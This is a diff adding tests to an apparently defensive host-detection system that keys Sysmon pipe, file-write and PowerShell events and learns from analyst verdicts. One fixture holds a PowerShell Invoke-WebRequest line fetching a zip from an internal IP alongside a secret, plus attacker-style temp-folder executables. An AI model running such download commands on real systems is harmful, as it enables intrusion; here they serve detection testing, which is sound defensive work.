@@ -45,6 +45,27 @@ def test_detector_keys():
     assert DETECTORS["lineage"].key(_logon(t)) is None and DETECTORS["logon"].key(_proc(t)) is None
 
 
+def test_pipe_file_write_and_powershell_keys(db):
+    import hashlib
+    from experiments.dedale_host_novelty import _shape
+    from perception.host_detection import script_fingerprint
+    t = TRAIN_END.isoformat()
+    pipe = {"t": t, "host": "CLIENT2", "rid": 7, "ch": "sysmon", "code": 17, "image": "C:\\x\\A.exe",
+            "pipe": "\\PSHost.1338.2244.DefaultAppDomain.powershell"}
+    assert DETECTORS["pipe"].key(pipe) == ("CLIENT2", "c:\\x\\a.exe", "\\pshost.#.#.defaultappdomain.powershell")
+    write = {"t": t, "host": "CLIENT2", "rid": 8, "ch": "sysmon", "code": 11, "image": "C:\\x\\A.exe",
+             "file": "C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.EXE"}
+    assert DETECTORS["exec_file_write"].key(write) == ("CLIENT2", "c:\\x\\a.exe", "exe")
+    script = "Invoke-WebRequest -Uri 'http://172.19.0.77/x.zip' " + SECRET
+    ps = {"t": t, "host": "CLIENT2", "rid": 9, "ch": "powershell", "code": 4104, "script": script}
+    key = DETECTORS["powershell"].key(ps)
+    assert key == ("CLIENT2", script_fingerprint(script))
+    assert script_fingerprint(script) == hashlib.sha256(_shape(script).encode()).hexdigest()   # = measurement
+    learn_key(db, "powershell", key, provenance="training", at=TRAIN_END, writer="test")
+    assert novel_keys(db, ps, ("powershell",)) == []
+    assert "Invoke-WebRequest" not in json.dumps(list(db.audit_log()))        # only the fingerprint is stored
+
+
 def test_learning_makes_a_key_known_and_logons_give_prior_access(db):
     t = TRAIN_END
     assert [n for n, _ in novel_keys(db, _proc(t), ("lineage",))] == ["lineage"]
@@ -98,6 +119,19 @@ def test_analyst_verdict_teaches_a_host_pattern(db):
     assert [v for _, _, v in loop.verdicts] == ["benign"] and loop.counts["alerts"] == 1
     assert db.edge_learned_from(image_node_id("C:\\Windows\\explorer.exe"), image_node_id("C:\\Tools\\backup.exe"),
                                 "host:client2") == "analyst"
+
+
+def test_analyst_confirming_a_host_alert_flags_the_host(db):
+    loop, _ = _loop(db, "gated", analyst=lambda case, d, at: "malicious")
+    bad = dict(_proc(TRAIN_END + timedelta(hours=10), image="C:\\Users\\client2\\AppData\\Local\\Temp\\svcmon.exe"),
+               rid=7)
+    loop.process_host_event(bad, TRAIN_END + timedelta(hours=10))
+    later = dict(_proc(TRAIN_END + timedelta(hours=15), image="C:\\Windows\\System32\\whoami.exe"), rid=8,
+                 t=(TRAIN_END + timedelta(hours=15)).isoformat().replace("+00:00", "Z"))
+    loop.process_host_event(later, TRAIN_END + timedelta(hours=15))                    # verdict due first
+    loop.finish(TRAIN_END + timedelta(hours=16))
+    assert [v for _, _, v in loop.verdicts] == ["malicious"]
+    assert any(w.action == "ANALYST_CONFIRMED" and w.target == "CLIENT2" for w in loop.monitor.finished)
 
 
 def test_static_mode_learns_nothing(db):
